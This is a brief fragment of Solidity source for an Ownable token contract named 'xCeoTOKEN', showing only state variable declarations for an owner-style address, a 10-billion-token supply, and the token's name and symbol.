...
contract xCeoTOKEN is Ownable {
    address public dsxxcz45;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "xCeo";
    string private _cctokensymbol = "xCeo";
